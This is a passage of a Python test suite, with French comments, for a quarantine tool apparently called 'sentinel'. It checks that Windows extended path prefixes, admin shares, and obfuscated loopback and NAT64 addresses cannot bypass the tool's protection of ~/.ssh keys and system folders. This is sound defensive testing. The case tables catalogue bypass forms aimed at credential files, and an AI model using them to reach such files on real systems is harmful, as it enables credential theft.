                if Path("/Library").is_dir():
                    os.environ["TMPDIR"] = "/Library"
                dest = Path("/Library/x/f")
                self.assertNotEqual(live_dest_class(dest), "allow")
            else:
                os.environ["TMPDIR"] = "/etc/x"
                if not Path("/etc/x").is_dir():
                    os.environ["TMPDIR"] = "/etc"
                dest = Path("/etc/x/f")
                self.assertEqual(live_dest_class(dest), "soft")
            records, failures = quarantine_paths([src], dest, dest / "manifest.jsonl")
            self.assertEqual(records, [])
            self.assertTrue(failures)
            self.assertTrue(src.exists())
            self.assertFalse(src_dir.joinpath("moved").exists())
        finally:
            src.unlink(missing_ok=True)
            src_dir.rmdir()
            if os.name == "nt":
                import shutil

                probe = Path(os.environ.get("APPDATA", "")) / "sentinel-x-probe"
                shutil.rmtree(probe, ignore_errors=True)

    def test_ordinary_temp_root_needs_force_contents_do_not(self) -> None:
        """TMPDIR hors emplacement connu : le dossier lui-même est souple."""
        import shutil

        base = Path(ROOT) / ".sentinel-ordinary-temp"
        shutil.rmtree(base, ignore_errors=True)
        ordinary = base / "scratch"
        store = base / "store"
        try:
            ordinary.mkdir(parents=True)
            store.mkdir()
            note = ordinary / "note.txt"
            note.write_text("keep\n", encoding="utf-8")
            os.environ["TMPDIR"] = str(ordinary)
            os.environ["TEMP"] = str(ordinary)
            os.environ["TMP"] = str(ordinary)
            self.assertEqual(live_dest_class(ordinary), "soft")
            self.assertEqual(live_dest_class(note), "allow")
            self.assertEqual(source_class(ordinary), "soft")
            self.assertEqual(source_class(note), "allow")
            records, failures = quarantine_paths([ordinary], store, store / "manifest.jsonl")
            self.assertEqual(records, [])
            self.assertTrue(failures)
            self.assertIn("sensible", failures[0][1])
            self.assertTrue(ordinary.is_dir())
            self.assertTrue(note.is_file())
            records, failures = quarantine_paths([note], store, store / "manifest.jsonl")
            self.assertEqual(failures, [], failures)
            self.assertEqual(len(records), 1)
            self.assertFalse(note.exists())
            self.assertTrue(ordinary.is_dir())
        finally:
            shutil.rmtree(base, ignore_errors=True)

    def test_ancestor_of_ordinary_temp_needs_force(self) -> None:
        """Ancêtre d'un TMPDIR ordinaire, quel que soit l'endroit du checkout.

        L'arbre est sous le dossier du compte, pas dans le temporaire du
        système : sur Windows et macOS celui-ci est dans ``%LOCALAPPDATA%``
        ou ``/private/var``, déjà souples. Les racines connues sont
        remplacées par un chemin qui ne contient pas cet arbre, donc la
        règle testée reste celle du temporaire ordinaire même si le
        compte lui-même est sous ``/tmp``.
        """
        import shutil
        from unittest import mock

        base = Path(tempfile.mkdtemp(prefix="sentinel-ancestor-", dir=Path.home()))
        work = base / "work"
        sub = work / "sub"
        store = base / "store"
        try:
            sub.mkdir(parents=True)
            store.mkdir()
            (sub / "f").write_text("z\n", encoding="utf-8")
            os.environ["TMPDIR"] = str(sub)
            os.environ["TEMP"] = str(sub)
            os.environ["TMP"] = str(sub)
            with mock.patch(
                "sentinel.platform.platform_temp_roots",
                return_value=["/sentinel-not-a-temp-root"],
            ):
                self.assertEqual(live_dest_class(work), "soft")
                self.assertEqual(live_dest_class(sub), "soft")
                self.assertEqual(live_dest_class(sub / "f"), "allow")
                self.assertEqual(source_class(work), "soft")
                records, failures = quarantine_paths([work], store, store / "manifest.jsonl")
            self.assertEqual(records, [])
            self.assertTrue(failures)
            self.assertIn("sensible", failures[0][1])
            self.assertTrue((sub / "f").is_file())
        finally:
            shutil.rmtree(base, ignore_errors=True)

    def test_ancestor_inside_system_temp_needs_force(self) -> None:
        """``/tmp/x`` est souple quand TMPDIR=/tmp/x/sub, sans dépendre du dépôt."""
        import shutil

        parent = Path(tempfile.mkdtemp(prefix="sentinel-inroot-"))
        sub = parent / "sub"
        store = Path(tempfile.mkdtemp(prefix="sentinel-inroot-store-"))
        try:
            sub.mkdir()
            (sub / "f").write_text("z\n", encoding="utf-8")
            os.environ["TMPDIR"] = str(sub)
            os.environ["TEMP"] = str(sub)
            os.environ["TMP"] = str(sub)
            self.assertEqual(live_dest_class(parent), "soft")
            self.assertEqual(live_dest_class(sub), "soft")
            self.assertEqual(live_dest_class(sub / "f"), "allow")
            records, failures = quarantine_paths([parent], store, store / "manifest.jsonl")
            self.assertEqual(records, [])
            self.assertTrue(failures)
            self.assertIn("sensible", failures[0][1])
            self.assertTrue((sub / "f").is_file())
        finally:
            shutil.rmtree(parent, ignore_errors=True)
            shutil.rmtree(store, ignore_errors=True)


class TestExtendedNtPrefixes(unittest.TestCase):
    """``\\\\?\\`` et ``\\\\.\\`` ne contournent pas les listes."""

    def test_drive_and_unc_prefixes_are_canonical(self) -> None:
        home = r"C:\Users\alice"
        extras = {
            "APPDATA": home + r"\AppData\Roaming",
            "LOCALAPPDATA": home + r"\AppData\Local",
            "SystemRoot": r"C:\Windows",
            "ProgramFiles": r"C:\Program Files",
            "ProgramFiles(x86)": r"C:\Program Files (x86)",
            "ProgramData": r"C:\ProgramData",
        }
        kwargs = {"os_name": "nt", "platform": "win32", "home": home, "extras": extras}
        _allow_remote_unc(self)
        cases = {
            r"\\?\C:\Users\alice\.ssh": "hard",
            r"\\?\C:\Users\alice\.ssh\id_ed25519": "hard",
            r"\\?\C:\Users\alice": "hard",
            r"//?/C:/Users/alice/.ssh": "hard",
            r"\\?\c:\users\alice\.SSH\id": "hard",
            r"\\?\C:\Users\alice\..\..\Windows\System32\q": "soft",
            r"\\?\C:\Windows\System32\q": "soft",
            r"//?/c:/windows/system32/q": "soft",
            r"\\?\C:\Users\alice\Projects\q": "allow",
            r"\\?\UNC\srv\share": "hard",
            r"\\?\UNC\srv\share\Users\alice\.ssh": "allow",
            r"//?/UNC/srv/share": "hard",
            r"\\?\UnC\Srv\Share\file": "allow",
            r"\\.\C:\Users\alice\.ssh": "hard",
            r"\\.\C:\Users\alice": "hard",
            r"\\.\C:\Windows\System32\q": "hard",
            r"//./C:/Users/alice/.ssh": "hard",
            r"//./c:/windows/system32/q": "hard",
            r"\\?\GLOBALROOT\Device\HarddiskVolume1\Windows": "hard",
            r"\\?\Volume{12345678-1234-1234-1234-1234567890ab}\Windows": "hard",
            "\\\\?\\UNC\\": "hard",
        }
        # Un UNC qui EST le profil reste dur.
        unc_home = r"\\srv\share\Users\alice"
        unc_kwargs = {**kwargs, "home": unc_home}
        for dest, expected in cases.items():
            with self.subTest(dest=dest):
                self.assertEqual(classify_dest_text(dest, **kwargs), expected)
        self.assertEqual(
            classify_dest_text(r"\\?\UNC\srv\share\Users\alice\.ssh", **unc_kwargs),
            "hard",
        )
        self.assertEqual(
            classify_dest_text(r"//?/UNC/srv/share/Users/alice", **unc_kwargs),
            "hard",
        )

    def test_extended_temp_root_and_its_parent(self) -> None:
        home = r"C:\Users\alice"
        kwargs = {
            "os_name": "nt",
            "platform": "win32",
            "home": home,
            "extras": {"LOCALAPPDATA": home + r"\AppData\Local", "SystemRoot": r"C:\Windows"},
        }
        temp = r"\\?\C:\Users\alice\work\sub"
        self.assertEqual(
            classify_dest_text(r"\\?\C:\Users\alice\work", **kwargs, temp=temp),
            "soft",
        )
        self.assertEqual(
            classify_dest_text(r"C:\Users\alice\work\sub\f", **kwargs, temp=temp),
            "allow",
        )
        self.assertEqual(
            classify_dest_text(r"\\.\C:\Users\alice\work\sub", **kwargs, temp=temp),
            "hard",
        )

    def test_unreadable_parent_is_not_treated_as_missing(self) -> None:
        """Un parent illisible n'est pas une absence.

        ``chmod(0)`` retire la traversée sur POSIX. Sur Windows, ``lstat``
        lit l'entrée du dossier parent (``FindFirstFile``) : ni ``chmod``
        ni un ACE deny sur la cible ne le font échouer. On pose quand
        même l'ACE (et on le retire), et si ``lstat`` passe encore on
        injecte ``PermissionError`` pour vérifier le contrat.
        """
        from unittest import mock

        from tests.osutil import allow_read, deny_read, is_privileged

        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            self.assertFalse(path_exists_strict(root / "absent"))
            locked = root / "locked"
            locked.mkdir()
            if os.name == "nt":
                previous = deny_read(locked)
                try:
                    denied = False
                    try:
                        path_exists_strict(locked)
                    except OSError:
                        denied = True
                    if not denied:
                        with (
                            mock.patch.object(
                                Path,
                                "lstat",
                                side_effect=PermissionError(13, "denied"),
                            ),
                            self.assertRaises(OSError),
                        ):
                            path_exists_strict(locked)
                finally:
                    allow_read(locked, previous)
                return
            if is_privileged():
                return
            child = locked / "child"
            child.mkdir()
            locked.chmod(0)
            try:
                with self.assertRaises(OSError):
                    path_exists_strict(child)
            finally:
                locked.chmod(0o700)


def _allow_remote_unc(test: unittest.TestCase) -> None:
    """Un nom UNC qui n'est pas cette machine résout vers une adresse publique."""
    from unittest import mock

    from sentinel import platform

    platform._clear_unc_dns_cache()

    def resolve(_host: str) -> tuple[str, ...]:
        return ("203.0.113.5",)

    query = mock.patch.object(platform, "_query_addrinfo", resolve)
    own = mock.patch.object(platform, "_machine_ips", return_value=frozenset())
    query.start()
    own.start()
    test.addCleanup(query.stop)
    test.addCleanup(own.stop)
    test.addCleanup(platform._clear_unc_dns_cache)


class TestLexicalNtAndAdminShares(unittest.TestCase):
    """Contournements lexicaux Windows, sans résolution disque. Tous les OS."""

    def _allow_remote_unc(self) -> None:
        _allow_remote_unc(self)

    def _kwargs(self, home: str | None = None) -> dict:
        home = home or r"C:\Users\alice"
        return {
            "os_name": "nt",
            "platform": "win32",
            "home": home,
            "extras": {
                "APPDATA": home + r"\AppData\Roaming",
                "LOCALAPPDATA": home + r"\AppData\Local",
                "SystemRoot": r"C:\Windows",
                "ProgramFiles": r"C:\Program Files",
                "ProgramFiles(x86)": r"C:\Program Files (x86)",
                "ProgramData": r"C:\ProgramData",
            },
        }

    def test_admin_shares_and_local_unc_are_hard(self) -> None:
        import socket
        from unittest import mock

        from sentinel.platform import _local_host_names

        kwargs = self._kwargs()
        self._allow_remote_unc()
        remote = "fileserver"
        if remote.casefold() in _local_host_names():
            remote = "sentinel-remote-share"
        ssh = r"\Users\alice\.ssh"
        cases = {
            r"\\localhost\C$\Users\alice\.ssh": "hard",
            r"\\LOCALHOST\c$\Users\alice\.ssh\id_ed25519": "hard",
            r"\\LocalHost\C$\Users\alice": "hard",
            r"\\127.0.0.1\c$\Users\alice\.ssh": "hard",
            r"\\127.0.0.1\Users\alice\.ssh": "hard",
            r"\\127.255.255.254\share\file": "hard",
            r"\\[::1]\share\Users\alice\.ssh": "hard",
            r"\\::1\share\file": "hard",
            r"\\0.0.0.0\share\file": "hard",
            r"\\?\UNC\localhost\C$\Users\alice\.ssh": "hard",
            r"//?/UNC/localhost/C$/Users/alice/.ssh": "hard",
            r"\\?\UnC\LOCALHOST\c$\Users\alice\.SSH\id": "hard",
            r"\\?\UNC\127.0.0.1\c$\Users\alice\.ssh": "hard",
            rf"\\{remote}\C$\Users\alice\.ssh": "hard",
            rf"\\{remote}\ADMIN$\System32\q": "hard",
            rf"\\{remote}\c$\Windows\System32\q": "hard",
            rf"\\{remote}\Public\note.txt": "allow",
            r"\\srv\share\Users\alice\.ssh": "allow",
            r"\\?\UNC\srv\share\file.txt": "allow",
            r"\\localhost\C$\Windows\System32\q": "hard",
            r"//127.0.0.1/c$/Users/alice/.ssh": "hard",
        }
        for dest, expected in cases.items():
            with self.subTest(dest=dest):
                self.assertEqual(classify_dest_text(dest, **kwargs), expected)
        # Le profil lui-même en UNC distant reste dur ; un partage local aussi.
        host = socket.gethostname()
        if host and host.casefold() not in {"srv", remote.casefold()}:
            self.assertEqual(
                classify_dest_text(rf"\\{host}\share{ssh}", **kwargs),
                "hard",
            )
            self.assertEqual(
                classify_dest_text(rf"\\{host.upper()}\share\file", **kwargs),
                "hard",
            )
        fqdn = socket.getfqdn()
        if fqdn and fqdn.casefold() not in {host.casefold(), "srv", remote.casefold()}:
            self.assertEqual(classify_dest_text(rf"\\{fqdn}\share\file", **kwargs), "hard")
        with mock.patch.dict(os.environ, {"COMPUTERNAME": "SentinelBox"}):
            self.assertEqual(
                classify_dest_text(r"\\SentinelBox\share\Users\alice\.ssh", **kwargs),
                "hard",
            )
            self.assertEqual(
                classify_dest_text(r"\\sentinelbox\docs\file", **kwargs),
                "hard",
            )
        # Hôtes ``.`` et ``?`` (forme UNC étendue) : refus, pas un allow.
        self.assertEqual(classify_dest_text(r"\\?\UNC\.\C$\Users\alice\.ssh", **kwargs), "hard")
        self.assertEqual(classify_dest_text(r"\\?\UNC\?\share\file", **kwargs), "hard")

    def test_unc_dns_timeout_default_is_two_seconds(self) -> None:
        from sentinel.platform import UNC_DNS_TIMEOUT

        self.assertEqual(UNC_DNS_TIMEOUT, 2.0)

    def test_legacy_loopback_forms_never_touch_dns(self) -> None:
        """Formes héritées, littéral IPv6 et ``.local`` : refus lexical, zéro DNS.

        ``classify_dest_text`` est la politique des destinations et des
        sources (``source_class`` passe par ``live_dest_class``).
        """
        import socket
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        platform._clear_unc_dns_cache()

        def boom(*_args: object, **_kwargs: object) -> object:
            raise AssertionError("DNS consulté")

        forms = [
            r"\\127.1\Users\alice\.ssh",
            r"\\127.1\Users",
            r"\\0x7f000001\Users",
            r"\\0X7F000001\Users\alice",
            r"\\2130706433\Users",
            r"\\0177.0.0.1\Users",
            r"\\0177.1\Users",
            r"\\127.0.1\Users",
            r"\\0x7f.1\Users",
            r"\\0x7F.0.0.1\Users",
            r"\\0--1.ipv6-literal.net\Users",
            r"\\0--1.IPV6-LITERAL.NET\Users\alice",
            r"\\127.0.0.1.\Users",
            r"\\[::ffff:127.0.0.1]\Users",
            r"\\[::FFFF:127.0.0.1]\Users\alice\.ssh",
            r"\\::ffff:127.0.0.1\Users",
            r"\\::1\share\file",
            r"\\[::1]\share\file",
            r"\\[::1].\share\file",
            r"\\::\share\file",
            r"\\[::]\share\file",
            r"\\0\share\file",
            r"\\0.0.0.0\share\file",
            r"\\?\UNC\127.1\Users\alice\.ssh",
            r"//?/UNC/127.1/Users/alice/.ssh",
            r"\\?\UNC\0x7f000001\Users",
            r"//?/unc/0--1.ipv6-literal.net/Users",
            r"\\localhost.\share\file",
            r"\\remote-fileserver\C$\Users",
            r"\\?\UNC\remote-fileserver\ADMIN$\System32",
            r"\\127.0.0.1\share\file:secret",
        ]
        host = socket.gethostname().strip().rstrip(".")
        if host:
            forms.append(rf"\\{host}.local\Users\alice")
            forms.append(rf"\\{host.upper()}.LOCAL\share\file")
        with (
            mock.patch.object(platform, "_query_addrinfo", boom),
            mock.patch.object(platform, "_machine_ips", boom),
            mock.patch.object(platform, "_machine_fqdn", boom),
            mock.patch.object(platform, "_machine_dns_domain", boom),
        ):
            for dest in forms:
                with self.subTest(dest=dest):
                    self.assertEqual(classify_dest_text(dest, **kwargs), "hard")

    def test_dns_domain_suffix_is_local_without_resolution(self) -> None:
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        platform._clear_unc_dns_cache()

        def boom(*_args: object, **_kwargs: object) -> object:
            raise AssertionError("DNS consulté")

        with (
            mock.patch.dict(os.environ, {"COMPUTERNAME": "SentinelBox"}),
            mock.patch.object(platform, "_machine_dns_domain", return_value="example.com"),
            mock.patch.object(platform, "_machine_fqdn", return_value="sentinelbox.example.com"),
            mock.patch.object(platform, "_query_addrinfo", boom),
            mock.patch.object(platform, "_machine_ips", boom),
        ):
            self.assertEqual(
                classify_dest_text(r"\\SentinelBox.example.com\share\file", **kwargs),
                "hard",
            )
            self.assertEqual(
                classify_dest_text(r"\\sentinelbox.EXAMPLE.com\docs\a", **kwargs),
                "hard",
            )

    def test_resolved_loopback_is_hard(self) -> None:
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        seen: list[str] = []

        def resolve(host: str) -> tuple[str, ...]:
            seen.append(host)
            return ("203.0.113.5", "127.0.0.1")

        platform._clear_unc_dns_cache()
        with (
            mock.patch.object(platform, "_query_addrinfo", resolve),
            mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
        ):
            self.assertEqual(
                classify_dest_text(r"\\arbitrary-name\share\file", **kwargs),
                "hard",
            )
            platform._clear_unc_dns_cache()
            seen.clear()

            def mapped(_host: str) -> tuple[str, ...]:
                seen.append(_host)
                return ("::ffff:127.0.0.1",)

            with mock.patch.object(platform, "_query_addrinfo", mapped):
                self.assertEqual(
                    classify_dest_text(r"\\other-name\share\file", **kwargs),
                    "hard",
                )
        self.assertTrue(seen)

    def test_resolution_failure_is_refused(self) -> None:
        import time
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import UncHostError

        kwargs = self._kwargs()

        def resolve(_host: str) -> tuple[str, ...]:
            raise OSError("introuvable")

        platform._clear_unc_dns_cache()
        started = time.monotonic()
        with (
            mock.patch.object(platform, "_query_addrinfo", resolve),
            mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
            self.assertRaises(UncHostError) as caught,
        ):
            classify_dest_text(r"\\missing-host\share\file", **kwargs)
        self.assertLess(time.monotonic() - started, 1.0)
        self.assertIn("impossible", str(caught.exception))

    def test_resolution_timeout_refuses_quickly(self) -> None:
        import threading
        import time
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import UncHostError

        kwargs = self._kwargs()
        release = threading.Event()
        done = threading.Event()

        def resolve(_host: str) -> tuple[str, ...]:
            try:
                release.wait(2.0)
                return ("203.0.113.5",)
            finally:
                done.set()

        platform._clear_unc_dns_cache()
        started = time.monotonic()
        try:
            with (
                mock.patch.object(platform, "UNC_DNS_TIMEOUT", 0.25),
                mock.patch.object(platform, "_query_addrinfo", resolve),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
                self.assertRaises(UncHostError) as caught,
            ):
                classify_dest_text(r"\\slow-host\share\file", **kwargs)
            elapsed = time.monotonic() - started
            self.assertLess(elapsed, 1.0)
            self.assertIn("expirée", str(caught.exception))
            cached = time.monotonic()
            with self.assertRaises(UncHostError):
                classify_dest_text(r"\\slow-host\share\file", **kwargs)
            self.assertLess(time.monotonic() - cached, 0.1)
        finally:
            # Le fil garde son créneau après le délai : on le laisse finir.
            release.set()
            done.wait(2)
            platform._clear_unc_dns_cache()

    def test_remote_non_local_host_is_not_refused_by_this_rule(self) -> None:
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        seen: list[str] = []

        def resolve(host: str) -> tuple[str, ...]:
            seen.append(host)
            return ("203.0.113.5", "2001:db8::10")

        def boom(*_args: object, **_kwargs: object) -> object:
            raise AssertionError("DNS consulté")

        platform._clear_unc_dns_cache()
        with (
            mock.patch.object(platform, "_query_addrinfo", resolve),
            mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
        ):
            self.assertEqual(
                classify_dest_text(r"\\remote-fileserver\public\file.txt", **kwargs),
                "allow",
            )
        self.assertEqual(seen, ["remote-fileserver"])
        platform._clear_unc_dns_cache()
        with (
            mock.patch.object(platform, "_query_addrinfo", boom),
            mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
        ):
            self.assertEqual(
                classify_dest_text(r"\\203.0.113.5\public\file.txt", **kwargs),
                "allow",
            )
            self.assertEqual(
                classify_dest_text(r"\\[2001:db8::10]\public\file.txt", **kwargs),
                "allow",
            )

    def test_own_address_is_hard_without_resolving_the_literal(self) -> None:
        import ipaddress
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        own = frozenset({ipaddress.ip_address("198.51.100.8")})
        seen: list[str] = []

        def resolve(host: str) -> tuple[str, ...]:
            seen.append(host)
            return ("198.51.100.8",)

        def boom(*_args: object, **_kwargs: object) -> object:
            raise AssertionError("DNS consulté")

        platform._clear_unc_dns_cache()
        with (
            mock.patch.object(platform, "_machine_ips", return_value=own),
            mock.patch.object(platform, "_query_addrinfo", boom),
        ):
            self.assertEqual(
                classify_dest_text(r"\\198.51.100.8\share\file", **kwargs),
                "hard",
            )
            self.assertEqual(
                classify_dest_text(r"\\[::ffff:198.51.100.8]\share\file", **kwargs),
                "hard",
            )
        platform._clear_unc_dns_cache()
        with (
            mock.patch.object(platform, "_machine_ips", return_value=own),
            mock.patch.object(platform, "_query_addrinfo", resolve),
        ):
            self.assertEqual(
                classify_dest_text(r"\\corp-pc\share\file", **kwargs),
                "hard",
            )
        self.assertEqual(seen, ["corp-pc"])

    def test_embedded_ipv4_and_link_local_are_refused_without_dns(self) -> None:
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        platform._clear_unc_dns_cache()

        def boom(*_args: object, **_kwargs: object) -> object:
            raise AssertionError("DNS consulté")

        hard = [
            r"\\[::127.0.0.1]\share\file",
            r"\\[::7f00:1]\share\file",
            r"\\[64:ff9b::7f00:1]\share\file",
            r"\\[64:ff9b::127.0.0.1]\share\file",
            r"\\[64:ff9b::a9fe:1]\share\file",
            r"\\[fe80::1]\share\file",
            r"\\fe80::1\share\file",
            r"\\169.254.1.1\share\file",
        ]
        with (
            mock.patch.object(platform, "_query_addrinfo", boom),
            mock.patch.object(platform, "_machine_ips", boom),
        ):
            for dest in hard:
                with self.subTest(dest=dest):
                    self.assertEqual(classify_dest_text(dest, **kwargs), "hard")
        platform._clear_unc_dns_cache()
        with (
            mock.patch.object(platform, "_query_addrinfo", boom),
            mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
        ):
            self.assertEqual(
                classify_dest_text(r"\\[64:ff9b::8.8.8.8]\public\file", **kwargs),
                "allow",
            )

    def test_translated_6to4_this_net_and_local_nat64(self) -> None:
        from unittest import mock

        from sentinel import platform

        kwargs = self._kwargs()
        platform._clear_unc_dns_cache()

        def boom(*_args: object, **_kwargs: object) -> object:
            raise AssertionError("DNS consulté")

        hard = [
            r"\\0.1.2.3\share\file",
            r"\\0.0.0.1\share\file",
            r"\\[::ffff:0:127.0.0.1]\share\file",
            r"\\[::ffff:0:0.1.2.3]\share\file",
            r"\\[2002:7f00:1::]\share\file",
            r"\\[2002:a9fe:1::]\share\file",
            r"\\[2002:1:203::]\share\file",
            r"\\[64:ff9b:1:7f00:0:100::]\share\file",
            r"\\[64:ff9b:1:1:2:300::]\share\file",
            r"\\[64:ff9b:1:a9fe:1:100::]\share\file",
        ]
        with (
            mock.patch.object(platform, "_query_addrinfo", boom),
            mock.patch.object(platform, "_machine_ips", boom),
        ):
            for dest in hard:
                with self.subTest(dest=dest):
                    self.assertEqual(classify_dest_text(dest, **kwargs), "hard")
        platform._clear_unc_dns_cache()
        with (
            mock.patch.object(platform, "_query_addrinfo", boom),
            mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
        ):
            for dest in (
                r"\\[2002:808:808::]\public\file",
                r"\\[::ffff:0:8.8.8.8]\public\file",
                r"\\[64:ff9b:1:808:8:800::]\public\file",
            ):
                with self.subTest(dest=dest):
                    self.assertEqual(classify_dest_text(dest, **kwargs), "allow")

    def test_windows_adapter_parser_reads_a_fake_buffer(self) -> None:
        import ctypes
        import ipaddress

        from sentinel.platform import (
            _IpAdapterAddresses,
            _IpAdapterUnicastAddress,
            _parse_adapter_unicast,
            _SockaddrIn,
            _SockaddrIn6,
        )

        kept: list[object] = []

        def push(item: object) -> int:
            kept.append(item)
            return ctypes.addressof(item)  # type: ignore[arg-type]

        def unicast(text: str, nxt: int) -> int:
            ip = ipaddress.ip_address(text)
            if isinstance(ip, ipaddress.IPv4Address):
                sock = _SockaddrIn()
                sock.sin_family = 2
                for index, byte in enumerate(ip.packed):
                    sock.sin_addr[index] = byte
            else:
                sock = _SockaddrIn6()
                sock.sin6_family = 23
                for index, byte in enumerate(ip.packed):
                    sock.sin6_addr[index] = byte
            uni = _IpAdapterUnicastAddress()
            uni.Length = ctypes.sizeof(uni)
            uni.lpSockaddr = push(sock)
            uni.iSockaddrLength = ctypes.sizeof(sock)
            uni.Next = nxt
            return push(uni)

        second = unicast("2001:db8::10", 0)
        first = unicast("198.51.100.20", second)
        adapter = _IpAdapterAddresses()
        adapter.Length = ctypes.sizeof(adapter)
        adapter.FirstUnicastAddress = first
        found = _parse_adapter_unicast(push(adapter))
        self.assertIn(ipaddress.IPv4Address("198.51.100.20"), found)
        self.assertIn(ipaddress.IPv6Address("2001:db8::10"), found)

    def test_windows_adapter_call_failure_is_closed(self) -> None:
        from unittest import mock

        from sentinel import platform

        def boom() -> object:
            raise OSError("GetAdaptersAddresses")

        with (
            mock.patch.object(platform.os, "name", "nt"),
            mock.patch.object(platform, "_query_adapter_addresses", boom),
        ):
            found, failed = platform._windows_adapter_ips()
        self.assertEqual(found, set())
        self.assertTrue(failed)

    def test_proc_read_ignores_os_name(self) -> None:
        from unittest import mock

        from sentinel import platform

        with (
            mock.patch.object(platform.os, "name", "nt"),
            mock.patch.object(platform, "_windows_adapter_ips", return_value=(set(), False)),
        ):
            found, failed = platform._interface_ips()
        self.assertIsInstance(found, set)
        self.assertFalse(failed)

    def test_windows_adapter_missing_api_is_closed(self) -> None:
        from unittest import mock

        from sentinel import platform

        def boom() -> object:
            raise AttributeError("GetAdaptersAddresses")

        with (
            mock.patch.object(platform.os, "name", "nt"),
            mock.patch.object(platform, "_query_adapter_addresses", boom),
        ):
            found, failed = platform._windows_adapter_ips()
        self.assertEqual(found, set())
        self.assertTrue(failed)

    def _unicast_chain(self, count: int) -> tuple[int, list[object]]:
        import ctypes
        import ipaddress

        from sentinel.platform import _IpAdapterUnicastAddress, _SockaddrIn

        kept: list[object] = []

        def push(item: object) -> int:
            kept.append(item)
            return ctypes.addressof(item)  # type: ignore[arg-type]

        nxt = 0
        for index in range(count):
            ip = ipaddress.IPv4Address(f"198.51.100.{index + 1}")
            sock = _SockaddrIn()
            sock.sin_family = 2
            for offset, byte in enumerate(ip.packed):
                sock.sin_addr[offset] = byte
            uni = _IpAdapterUnicastAddress()
            uni.Length = ctypes.sizeof(uni)
            uni.lpSockaddr = push(sock)
            uni.iSockaddrLength = ctypes.sizeof(sock)
            uni.Next = nxt
            nxt = push(uni)
        return nxt, kept

    def test_windows_adapter_keeps_more_than_64_addresses(self) -> None:
        import ctypes
        import ipaddress

        from sentinel.platform import _IpAdapterAddresses, _parse_adapter_unicast

        head, kept = self._unicast_chain(65)
        adapter = _IpAdapterAddresses()
        adapter.Length = ctypes.sizeof(adapter)
        adapter.FirstUnicastAddress = head
        kept.append(adapter)
        found = _parse_adapter_unicast(ctypes.addressof(adapter))
        self.assertEqual(len(found), 65)
        self.assertIn(ipaddress.IPv4Address("198.51.100.1"), found)
        self.assertIn(ipaddress.IPv4Address("198.51.100.65"), found)

    def test_windows_adapter_walk_limit_fails_closed(self) -> None:
        import ctypes
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import _IpAdapterAddresses

        head, kept = self._unicast_chain(3)
        adapter = _IpAdapterAddresses()
        adapter.Length = ctypes.sizeof(adapter)
        adapter.FirstUnicastAddress = head
        kept.append(adapter)
        with (
            mock.patch.object(platform, "_ADAPTER_WALK_LIMIT", 2),
            self.assertRaises(OSError),
        ):
            platform._parse_adapter_unicast(ctypes.addressof(adapter))

    def test_machine_ips_is_single_flight(self) -> None:
        import ipaddress
        import threading
        import time
        from unittest import mock

        from sentinel import platform

        entered = threading.Event()
        release = threading.Event()
        calls = {"iface": 0, "dns": 0}

        def iface() -> tuple[set[object], bool]:
            calls["iface"] += 1
            entered.set()
            release.wait(3)
            return {ipaddress.ip_address("198.51.100.8")}, False

        def bounded(func: object, timeout: float) -> tuple[str, object]:
            del func, timeout
            calls["dns"] += 1
            return "ok", ("198.51.100.9",)

        def one() -> None:
            platform._machine_ips()

        platform._clear_unc_dns_cache()
        try:
            with (
                mock.patch.object(platform, "_interface_ips", iface),
                mock.patch.object(platform, "_run_bounded", bounded),
            ):
                threads = [threading.Thread(target=one) for _ in range(2)]
                for thread in threads:
                    thread.start()
                self.assertTrue(entered.wait(2))
                time.sleep(0.05)
                release.set()
                for thread in threads:
                    thread.join(3)
                    self.assertFalse(thread.is_alive())
            self.assertEqual(calls["iface"], 1)
            self.assertEqual(calls["dns"], 1)
        finally:
            release.set()
            platform._clear_unc_dns_cache()

    def test_caller_deadline_covers_fqdn_and_lookup(self) -> None:
        import threading
        import time
        from unittest import mock

        from sentinel import platform
        from sentinel.platform import UncHostError

        kwargs = self._kwargs()
        addr_done = threading.Event()

        def slow_fqdn() -> str:
            time.sleep(0.30)
            return "sentinelbox.example.com"

        def slow_addr(host: str) -> tuple[str, ...]:
            del host
            time.sleep(0.40)
            addr_done.set()
            return ("203.0.113.5",)

        def fast_addr(host: str) -> tuple[str, ...]:
            del host
            return ("203.0.113.5",)

        platform._clear_unc_dns_cache()
        try:
            with (
                mock.patch.object(platform, "UNC_DNS_TIMEOUT", 0.45),
                mock.patch.object(platform.socket, "getfqdn", slow_fqdn),
                mock.patch.object(platform, "_query_addrinfo", slow_addr),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
            ):
                began = time.monotonic()
                with self.assertRaises(UncHostError) as caught:
                    classify_dest_text(r"\\shared-host.example\public\file", **kwargs)
                elapsed = time.monotonic() - began
            self.assertIn("expirée", str(caught.exception))
            self.assertGreater(elapsed, 0.35)
            self.assertLess(elapsed, 0.62)
            self.assertTrue(addr_done.wait(2))
            with (
                mock.patch.object(platform, "UNC_DNS_TIMEOUT", 0.45),
                mock.patch.object(platform, "_query_addrinfo", fast_addr),
                mock.patch.object(platform, "_machine_ips", return_value=frozenset()),
            ):
                self.assertEqual(
                    classify_dest_text(r"\\shared-host.example\public\file", **kwargs),
                    "allow",
                )
        finally:
            addr_done.set()
            platform._clear_unc_dns_cache()

    def test_fqdn_failure_expires_and_busy_is_not_cached(self) -> None:
        import time
        from unittest import mock

        from sentinel import platform

        clock = {"now": 5_000.0}
        calls = {"n": 0}

        def now() -> float:
            return clock["now"]

        def bounded(func: object, timeout: float) -> tuple[str, object]:
            del func, timeout
            calls["n"] += 1
            if calls["n"] == 1:
                return "busy", None
            if calls["n"] == 2:
                return "error", OSError("dns")
            return "ok", "box.example.com"

        platform._clear_unc_dns_cache()
